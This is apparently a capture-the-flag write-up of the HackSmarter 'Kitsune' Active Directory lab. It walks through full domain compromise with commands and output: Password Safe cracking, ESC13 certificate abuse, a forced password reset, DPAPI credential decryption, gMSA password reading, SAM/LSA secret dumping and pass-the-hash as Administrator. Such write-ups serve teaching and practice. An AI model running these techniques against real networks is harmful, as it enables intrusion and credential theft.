---
layout: article
title: "Kitsune"
date: 2026-11-26
platform: "HackSmarter"
excerpt: "Kitsune is an Easy Active Directory machine from HackSmarter that demonstrates guest share enumeration, password-safe cracking, ESC13 certificate abuse, BloodHound lateral movement, GMSA pas[...]"
---

# Kitsune

```bash
Author: 'Brice Isezerano'
Difficulty: 'Easy'
Platform: 'HackSmarter'
```

## Objective

This is an easy Active Directory machine from HackSmarter.

You have been hired to perform an internal pentest against the client’s Domain Controller. Your task is to identify all vulnerabilities and (if possible) fully compromise the Domain.

# Recon

The first thing I start doing during an internal testing is scan the IP and find out what ports are open, services running and versions, and other auguments.

Looking at my `rustscan` & `nmap` results

```bash
┌──(kali㉿kali)-[~/Desktop/Hacking/HSM]
└─$ rustscan -a 10.1.157.213 -- -sC -sV -A --oN nmap
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Making sure 'closed' isn't just a state of mind.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.1.157.213:53
Open 10.1.157.213:88
Open 10.1.157.213:135
Open 10.1.157.213:139
Open 10.1.157.213:389
Open 10.1.157.213:445
Open 10.1.157.213:464
Open 10.1.157.213:593
Open 10.1.157.213:636
Open 10.1.157.213:3268
Open 10.1.157.213:3269
Open 10.1.157.213:3389
Open 10.1.157.213:5985
Open 10.1.157.213:9389
Open 10.1.157.213:49664
Open 10.1.157.213:49666
Open 10.1.157.213:49672
Open 10.1.157.213:49673
Open 10.1.157.213:49674
Open 10.1.157.213:49693
Open 10.1.157.213:49723
Open 10.1.157.213:49735
Open 10.1.157.213:49759
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -A --oN nmap" on ip 10.1.157.213
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-24 13:51 -0500
NSE: Loaded 158 scripts for scanning.                                                       

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-11-24 18:51:34Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Issuer: commonName=kitsune-DC01-CA/domainComponent=kitsune
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-12T21:14:40
| Not valid after:  2027-10-12T21:14:40
| MD5:     d44b d58b d60d de16 8e25 54c7 79fa 4ca9
| SHA-1:   1656 60d1 a7d3 9544 8b6c 3318 bedb 0f08 1cb8 cd04
| SHA-256: accf a633 3f9b 87f6 4015 eaef 64cc e082 cdb1 4f81 d6ff e4bb a7f4 c35c 736b e636

|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Issuer: commonName=kitsune-DC01-CA/domainComponent=kitsune
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-12T21:14:40
| Not valid after:  2027-10-12T21:14:40
| MD5:     d44b d58b d60d de16 8e25 54c7 79fa 4ca9
| SHA-1:   1656 60d1 a7d3 9544 8b6c 3318 bedb 0f08 1cb8 cd04
| SHA-256: accf a633 3f9b 87f6 4015 eaef 64cc e082 cdb1 4f81 d6ff e4bb a7f4 c35c 736b e636

|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Issuer: commonName=kitsune-DC01-CA/domainComponent=kitsune
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-12T21:14:40
| Not valid after:  2027-10-12T21:14:40
| MD5:     d44b d58b d60d de16 8e25 54c7 79fa 4ca9
| SHA-1:   1656 60d1 a7d3 9544 8b6c 3318 bedb 0f08 1cb8 cd04
| SHA-256: accf a633 3f9b 87f6 4015 eaef 64cc e082 cdb1 4f81 d6ff e4bb a7f4 c35c 736b e636

|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
| Issuer: commonName=kitsune-DC01-CA/domainComponent=kitsune
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-12T21:14:40
| Not valid after:  2027-10-12T21:14:40
| MD5:     d44b d58b d60d de16 8e25 54c7 79fa 4ca9
| SHA-1:   1656 60d1 a7d3 9544 8b6c 3318 bedb 0f08 1cb8 cd04
| SHA-256: accf a633 3f9b 87f6 4015 eaef 64cc e082 cdb1 4f81 d6ff e4bb a7f4 c35c 736b e636

3389/tcp  open  ms-wbt-server syn-ack ttl 126
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: KITSUNE
|   NetBIOS_Domain_Name: KITSUNE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: kitsune.local
|   DNS_Computer_Name: DC01.kitsune.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-11-24T18:52:45+00:00
| ssl-cert: Subject: commonName=DC01.kitsune.local
| Issuer: commonName=DC01.kitsune.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-11T08:21:43
| Not valid after:  2027-04-12T08:21:43
| MD5:     b376 6ca1 5419 2d44 262e 0817 77ab 4bcf
| SHA-1:   0d55 4168 2732 d664 a4a3 77bd e2f6 fb9e 02bf dfae
| SHA-256: ea44 abd8 01e0 9f4b 3c37 fe15 2fca 4188 ce32 2f66 1f72 d496 8bb8 7b06 3aec 5ad4

5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49693/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49723/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49735/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49759/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=11/24%Time=6B05DCBA%P=x86_64-pc-linux-gnu%r(T
SF:erminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02
SF:\0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=11/24%OT=53%CT=%CU=%PV=Y%DS=3%DC=T%G=N%TM=6B05DD28%P=x86_64-pc-linux-gnu)
SEQ(SP=108%GCD=1%ISR=109%TI=RD%TS=B)
SEQ(SP=FF%GCD=1%ISR=111%TI=I%TS=A)
OPS(O1=M510NW8ST11%O2=M510NW8ST11%O3=M510NW8NNT11%O4=M510NW8ST11%O5=M510NW8ST11%O6=M510ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M510NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=N)

Uptime guess: 0.020 days (since Tue Nov 24 13:25:21 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50965/tcp): CLEAN (Timeout)
|   Check 2 (port 12826/tcp): CLEAN (Timeout)
|   Check 3 (port 41982/udp): CLEAN (Timeout)
|   Check 4 (port 32876/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-11-24T18:52:49
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   419.76 ms 10.200.0.1
2   ...
3   455.99 ms 10.1.157.213

Nmap done: 1 IP address (1 host up) scanned in 124.02 seconds
           Raw packets sent: 121 (9.664KB) | Rcvd: 52 (2.808KB)

```

![image.png]({{ '/assets/images/kitsunehsm/image.png' | relative_url }})

On a black-box pentest, the next thing to do is try to enumerate users on the system using kerbrute (Disclaimer: `It's noisy`) 

### User Enumeration

From our results, we found two valid users. 

![Kerbrute user enumeration]({{ '/assets/images/kitsunehsm/image%201.png' | relative_url }})

1. Ross
2. Administrator
3. Ranch
4. Pebble
5. Guest

I’m going to start enumerating user `ross` who seems to be our potential target.
I’m firstly going to try password resuse, then bruteforce will be next.

![Testing credentials against domain users]({{ '/assets/images/kitsunehsm/image%202.png' | relative_url }})

`I enumerated all the users, but none of them was kerbroastable and was reusing their username as password, But I got the password for Guest: [REDACTED]  Which then I used to read shares on the system.`

### Enumerating shares with enum4linux

I used enum4linux with the guest credentials to enumerate the domain then i found out that guest can read the **`Files`** share.

![Enum4linux share enumeration]({{ '/assets/images/kitsunehsm/image%203.png' | relative_url }})

### Reading share with smbclient

![Accessing the Files SMB share]({{ '/assets/images/kitsunehsm/image%204.png' | relative_url }})

### Cracking the master password for pwsafee database

I found a password safe database, that required a master password to unlock.
I used `pwsafe2john` to crack it.

```bash
┌──(kali㉿kali)-[~/Desktop/Hacking/HSM]
└─$ pwsafe2john logins.psafe3 
login:[REDACTED]
                                                                                                                              
┌──(kali㉿kali)-[~/Desktop/Hacking/HSM]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt login_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 327680 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]       (login)     
1g 0:00:00:48 DONE (2026-11-25 08:16) 0.02055g/s 84.21p/s 84.21c/s 84.21C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Unfortunately, I can’t screenshot the passwordsafe window due to its security.

The password for Ranch user == `[REDACTED]`

# Initial Access

### Gained the credentials for user ranch

![Ranch SMB authentication]({{ '/assets/images/kitsunehsm/image%205.png' | relative_url }})

### Bloodhound

I collected the domain data using bloodhound with ranch credentials.

![BloodHound collection]({{ '/assets/images/kitsunehsm/image%206.png' | relative_url }})

# Enumerating ADCS

With the credentials of ranch, I wanted to find out the if the certificate service was vulnerable

The results from certipy-ad

```bash
┌──(kali㉿kali)-[~/Desktop/Hacking/HSM]
└─$ certipy-ad find -target DC01.kitsune.local -u ranch -p '[REDACTED]' -stdout -vulnerable
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC01.kitsune.local.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 1 OID linked to a template
[*] Retrieving CA configuration for 'kitsune-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'kitsune-DC01-CA'
[*] Checking web enrollment for CA 'kitsune-DC01-CA' @ 'DC01.kitsune.local'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : kitsune-DC01-CA
    DNS Name                            : DC01.kitsune.local
    Certificate Subject                 : CN=kitsune-DC01-CA, DC=kitsune, DC=local
    Certificate Serial Number           : 23E87814E94E648848405CFD9514BD14
    Certificate Validity Start          : 2026-10-12 21:14:31+00:00
    Certificate Validity End            : 2125-10-12 21:24:31+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : KITSUNE.LOCAL\Administrators
      Access Rights
        ManageCa                        : KITSUNE.LOCAL\Administrators
                                          KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        ManageCertificates              : KITSUNE.LOCAL\Administrators
                                          KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Enroll                          : KITSUNE.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : Kitsune-User
    Display Name                        : Kitsune-User
    Certificate Authorities             : kitsune-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2026-10-12T22:12:00+00:00
    Template Last Modified              : 2026-10-13T00:52:56+00:00
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.10863307.14988779.16010669.3757508.10421200.134.6077557.15214621
    Linked Groups                       : CN=HelpDesk,CN=Users,DC=kitsune,DC=local
    Permissions
      Enrollment Permissions
        Enrollment Rights               : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Domain Users
                                          KITSUNE.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : KITSUNE.LOCAL\Administrator
        Full Control Principals         : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Write Owner Principals          : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Write Dacl Principals           : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Enterprise Admins
        Write Property Enroll           : KITSUNE.LOCAL\Domain Admins
                                          KITSUNE.LOCAL\Domain Users
                                          KITSUNE.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : KITSUNE.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=HelpDesk,CN=Users,DC=kitsune,DC=local'.

```

I was able to find the CA  name, the vulnerable cert, and the template name

```bash
CA-name: 'kitsune-DC01-CA'
Vulnerable template: 'ESC13'
Template name: 'Kitsune-User'
```

### Exploiting the ESC13

The next step was to exploit the certificate and authenticate ourselves to the helpdesk group

1. Requesting for the certificate

```bash
┌──(kali㉿kali)-[~/Desktop/Hacking/HSM]
└─$ certipy-ad req -u 'ranch@kitsune.local' -p '[REDACTED]' -ca 'kitsune-DC01-CA' -target 'DC01.kitsune.local' -dc-ip 10.1.157.213 -template 'Kitsune-User' -key-size 4096
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'ranch@kitsune.local'
[*] Certificate object SID is 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Saving certificate and private key to 'ranch.pfx'
[*] Wrote certificate and private key to 'ranch.pfx'

```

![Requesting the ESC13 certificate]({{ '/assets/images/kitsunehsm/image%207.png' | relative_url }})

1. Authenticating with the acquired certificate.

```bash
┌──(kali㉿kali)-[~/Desktop/Hacking/HSM]
└─$ certipy-ad auth -pfx ranch.pfx -dc-ip 10.1.157.213
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ranch@kitsune.local'
[*]     Security Extension SID: 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Using principal: 'ranch@kitsune.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ranch.ccache'
[*] Wrote credential cache to 'ranch.ccache'
[*] Trying to retrieve NT hash for 'ranch'
[*] Got hash for 'ranch@kitsune.local': [REDACTED]
   
```

We have exploited the ESC13 template to give ourselves access to `Helpdesk group` and now Helpdesk, has `GenericAll` to user `schlop.`

# Exploiting user `schlop`

![HelpDesk GenericAll relationship]({{ '/assets/images/kitsunehsm/image%208.png' | relative_url }})

### Changed the password for schlop

I used bloodyad authenticated with kerberos to change the password

```bash
┌──(kali㉿kali)-[~/Desktop/Hacking/HSM]
└─$ bloodyad --host DC01.kitsune.local -d kitsune.local  -k set password schlop '[REDACTED]'
[+] Password changed successfully!
```

# Auth as schlop

![Authenticating as schlop]({{ '/assets/images/kitsunehsm/image%209.png' | relative_url }})

Schlop is a member of remote mng group, So I can winrm. I will used evil-winrm to authenticate and get the user-flag

# user flag

I authenticated as schlop and I got the user flag.

![Reading the user flag]({{ '/assets/images/kitsunehsm/image%2010.png' | relative_url }})

# Lateral Movement

Looking at my documents folder, inside the schlop account. I can see a networkAuth.cred file and when i list its content, I can see username for `pebble` and his password

```bash
*Evil-WinRM* PS C:\Users\schlop> cd Documents
*Evil-WinRM* PS C:\Users\schlop\Documents> ls

    Directory: C:\Users\schlop\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/13/2026   2:37 AM           1770 networkAuth.cred

*Evil-WinRM* PS C:\Users\schlop\Documents> type networkAuth.cred
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">pebble</S>
      <SS N="Password">[REDACTED]</SS>
    </Props>
  </Obj>
</Objs>

```

To decrypt the password, I used an online writeup about window’s DPA APIs

The file is a PowerShell credential exported with `Export-Clixml`, which encrypts the password with DPAPI (Data Protection API) keyed to the user and machine that created it. We are in `schlop`’s session on the domain controller, so if `schlop` saved the file, `Import-Clixml` decrypts it in place with no key handling. The username inside is `pebble`.

```bash
Evil-WinRM* PS C:\Users\schlop\Documents> $cred = Import-Clixml -Path networkAuth.cred
*Evil-WinRM* PS C:\Users\schlop\Documents> $cred.GetNetworkCredential().Password
[REDACTED]
*Evil-WinRM* PS C:\Users\schlop\Documents> 

```

# Auth as pebble

With Pebble`s password, we can now enumerate and find out what rights he has in bloodhound.

![Pebble BloodHound path]({{ '/assets/images/kitsunehsm/image%2011.png' | relative_url }})

We can see that pebble is a member of `IT` and IT has `ReadGMSAPassword` on `SVC_GMSA` account

### Reading GMSA password

And with one liner command, using netexec we were able to read the gmsa password using pebble`s account because he's a member of IT group

```bash
──(kali㉿kali)-[~/Desktop/Hacking/HSM]
└─$ nxc ldap kitsune.local -u pebble -p '[REDACTED]' --gmsa
LDAP        10.1.157.213    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) (signing:Enforced) (channel binding:Never)                                                                                                        
LDAP        10.1.157.213    389    DC01             [+] kitsune.local\pebble:[REDACTED]
LDAP        10.1.157.213    389    DC01             [*] Getting GMSA Passwords
LDAP        10.1.157.213    389    DC01             Account: svc_gmsa$            NTLM: [REDACTED]     PrincipalsAllowedToReadPassword: IT
```

# Root flag

The first thing I did was to login into SYSVOL and download the SYSTEM file to my local pc. 

Then I used `impacket-secretsdump` to dump the secrets, “hashes” of the domain local users including admins hash.

```bash
──(kali㉿kali)-[~/.nxc/logs]
└─$ smbclient //10.1.157.213/SYSVOL \
  -U 'KITSUNE.LOCAL/SVC_GMSA$%[REDACTED]' \
  --pw-nt-hash -t 120

Try "help" to get a list of possible commands.
smb: \> get SYSTEM
getting file \SYSTEM of size 19251200 as SYSTEM (196.8 KiloBytes/sec) (average 196.8 KiloBytes/sec)
smb: \> exit
                                                                                                                                         
┌──(kali㉿kali)-[~/.nxc/logs]
└─$ ls                        
dpapi  lsa  ntds  sam  SAM  SECURITY  SYSTEM
                                                                                                                                         
┌──(kali㉿kali)-[~/.nxc/logs]
└─$ ls -lh                    
total 19M
drwxrwxr-x 2 kali kali 4.0K Aug  1 17:54 dpapi
drwxrwxr-x 2 kali kali 4.0K Aug  1 17:54 lsa
drwxrwxr-x 2 kali kali 4.0K Aug  1 17:54 ntds
drwxrwxr-x 2 kali kali 4.0K Aug  1 17:54 sam
-rw-rw-r-- 1 kali kali  28K Nov 25 11:14 SAM
-rw-rw-r-- 1 kali kali  36K Nov 25 11:14 SECURITY
-rw-r--r-- 1 kali kali  19M Nov 25 11:49 SYSTEM
                                                                                                                                         
┌──(kali㉿kali)-[~/.nxc/logs]
└─$ impacket-secretsdump \
  -sam SAM \
  -security SECURITY \
  -system SYSTEM \
  LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: [REDACTED]
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:[REDACTED]
Guest:501:[REDACTED]
DefaultAccount:503:[REDACTED]
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:[REDACTED]
$MACHINE.ACC: [REDACTED]
[*] DPAPI_SYSTEM 
dpapi_machinekey:[REDACTED]
dpapi_userkey:[REDACTED]
[*] NL$KM 
 0000   D6 F9 1E BE 20 95 21 6A  88 22 1F 5C 92 CE 2C 8A   .... .!j.".\..,.
 0010   BB CF 2C 38 59 53 A4 3A  EF A0 03 DA EA A5 A8 CF   ..,8YS.:........
 0020   0E 6F 91 92 02 3E 5B 45  40 E2 C7 A8 D5 DA 8B 11   .o...>[E@.......
 0030   6D 77 6B 5F 3F 78 48 12  0F BF A8 CE 06 C2 C6 7C   mwk_?xH........|
NL$KM:[REDACTED]
[*] Cleaning up... 

```

### Auth as admin

I logged in as admin using evil-winrm with the hash I obtained from secretsdump.

And got the root flag.

```bash
──(kali㉿kali)-[~/.nxc/logs]
└─$ evil-winrm -i 10.1.157.213 -u Administrator -H '[REDACTED]'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/13/2026   4:17 AM           1885 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
......................................................................
......................................................................
......................................................................
................................-%@@%-................................
.............................:%@@@@@@@@%:.............................
............................*@@@@@@@@@@@@#............................
...........................%@@@@@@@@@@@@@@@...........................
..........................@@@@@@@@@@@@@@@@@@:.........................
.........................@@@@@%#=-::-=#%@@@@@:........................
........................#@%+-=++=:..:=+++-=%@#........................
.......................=@%@@@-..:*@@#:..-@@@@@+.......................
.......................#@@@@##:::%--%:::##@@@@#.......................
.......................-@@@@+.:::....:::.+@@@@-.......................
........................:@@@@-..........-@@@@:........................
.......................-##*@@@#........#@@@*##=.......................
....................-@@@@@@%%@@@%+::+%@@@%%@@@@@@-....................
...................%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%...................
..................%@@@=------------------------=@@@%..................
.................*@@@#..........................%@@@+.................
.................@@@@@..........................@@@@@.................
................+@@@@@:..........*@@#..........:@@@@@+................
................#@@@@@=..........:@@-..........=@@@@@#................
................*@@@@@*........ranch...........*@@@@@*................
......................%.......obtained.........@......................
......................=@@@@@@@@@@@@@@@@@@@@@@@@=......................
......................................................................

HSM{13c4897877292fc104173ad41e4d166a}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

## Authors thougts

1. This machine was very easy for a beginner penetester
2. It required thinking outside the box, because of how it was built. 
3. And its good machine to start with if you`re getting into AD penetesting or Red Teaming